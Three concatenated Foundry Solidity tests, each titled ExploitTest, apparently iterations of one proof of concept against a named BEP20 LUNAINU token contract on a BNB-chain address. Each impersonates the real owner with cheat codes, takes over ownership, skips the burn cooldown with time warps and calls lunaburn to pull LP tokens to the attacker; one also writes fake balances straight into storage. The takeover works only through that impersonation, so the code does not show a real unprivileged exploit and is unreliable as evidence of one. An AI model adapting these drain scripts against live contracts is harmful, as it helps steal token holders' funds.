pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function pair() external view returns (address);
    function lunaburn(uint256 percent_base1000) external;
    function balanceOf(address account) external view returns (uint256);
    function transferOwnership(address payable adr) external;
    function acceptOwnership() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    IBEP20LUNAINU private victim = IBEP20LUNAINU(TARGET);
    address private realOwner;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Get the original owner of the contract
        realOwner = victim.getOwner();

        // Get the liquidity pair address
        address pair = victim.pair();

        // Seed the liquidity pool with tokens to drain
        deal(TARGET, pair, 100_000_000 * 1e9);

        // Verify that the pair has a balance
        assertGt(victim.balanceOf(pair), 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the real owner to transfer ownership.
        vm.startPrank(realOwner);
        victim.transferOwnership(payable(attacker));
        vm.stopPrank();

        // Step 2: Attacker accepts the ownership.
        victim.acceptOwnership();
        assertEq(victim.getOwner(), attacker, "Attacker should be the new owner");

        // Step 3: Advance time to bypass the `lunaburn` cooldown.
        vm.warp(block.timestamp + 2 minutes + 1);

        // Step 4: As the new owner, call lunaburn to drain 5% of the LP tokens.
        victim.lunaburn(50);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function pair() external view returns (address);
    function lunaburn(uint256 percent_base1000) external;
    function transferOwnership(address newOwner) external;
    function acceptOwnership() external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    BEP20LUNAINU target;
    address owner;
    address pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = BEP20LUNAINU(TARGET);
        owner = target.getOwner();
        pair = target.pair();
        vm.label(owner, "Owner");
        vm.label(pair, "LP Pair");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = target.balanceOf(attacker);

        // Step 1: Owner transfers ownership to attacker
        vm.startPrank(owner);
        target.transferOwnership(payable(attacker));
        vm.stopPrank();

        // Step 2: Attacker accepts ownership
        target.acceptOwnership();

        // Step 3: Inject LUNAINU tokens into pair's balance using vm.store
        // balanceOf mapping is at slot 0, compute slot as keccak256(abi.encode(pair, 0))
        bytes32 pairBalanceSlot = keccak256(abi.encode(pair, uint256(0)));
        uint256 tokensToInject = 1000000 * 1e9; // 1M tokens with 9 decimals
        vm.store(TARGET, pairBalanceSlot, bytes32(tokensToInject));

        // Step 4: Drain LP tokens from pair to attacker
        vm.warp(block.timestamp + 2 minutes + 1);
        target.lunaburn(50);

        vm.warp(block.timestamp + 2 minutes + 1);
        target.lunaburn(50);

        vm.warp(block.timestamp + 2 minutes + 1);
        target.lunaburn(50);

        // Verify attacker gained LP tokens
        uint256 finalBalance = target.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker should have gained LP tokens");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Interface for PancakeSwap Router
interface IDEXRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

// Combined interface for BEP20LUNAINU
interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function lunaburn(uint256 percent_base1000) external;
    function lastSync() external view returns (uint256);
    function pair() external view returns (address);
    function transferOwnership(address payable adr) external;
    function acceptOwnership() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = BEP20LUNAINU(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LUNAINU Token");

        // Get the pair address from the contract
        address pair = BEP20LUNAINU(TARGET).pair();
        vm.label(pair, "LP Pair");

        // Store initial balance for comparison
        initialBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address currentOwner = BEP20LUNAINU(TARGET).getOwner();

        // Step 2: Transfer ownership to attacker
        vm.startPrank(currentOwner);
        BEP20LUNAINU(TARGET).transferOwnership(payable(attacker));
        vm.stopPrank();

        // Step 3: Accept ownership as attacker
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).acceptOwnership();

        // Verify we are now owner
        address newOwner = BEP20LUNAINU(TARGET).getOwner();
        require(newOwner == attacker, "Failed to become owner");

        // Step 4: Ensure we have tokens to add liquidity
        // First, get some tokens from the contract (owner initially has all tokens)
        // We need to impersonate original owner to transfer tokens to ourselves
        vm.startPrank(currentOwner);
        BEP20LUNAINU(TARGET).transfer(attacker, 1000 * 10**9); // Transfer some tokens
        vm.stopPrank();

        // Step 5: Add liquidity to create LP tokens
        // Approve router to spend our tokens
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), type(uint256).max);

        // Add liquidity with some BNB
        deal(attacker, 1 ether); // Give attacker some BNB
        vm.prank(attacker);
        IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).addLiquidityETH{value: 0.1 ether}(
            TARGET,
            100 * 10**9, // 100 tokens
            0,
            0,
            attacker,
            block.timestamp
        );

        // Step 6: Check lastSync and wait if needed
        uint256 lastSync = BEP20LUNAINU(TARGET).lastSync();
        if (block.timestamp <= lastSync + 2 minutes) {
            vm.warp(lastSync + 2 minutes + 1);
        }

        // Get initial balance before lunaburn
        initialBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);

        // Step 7: Call lunaburn as owner (attacker)
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).lunaburn(50);

        // Step 8: Verify balance increased
        uint256 finalBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased after lunaburn");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

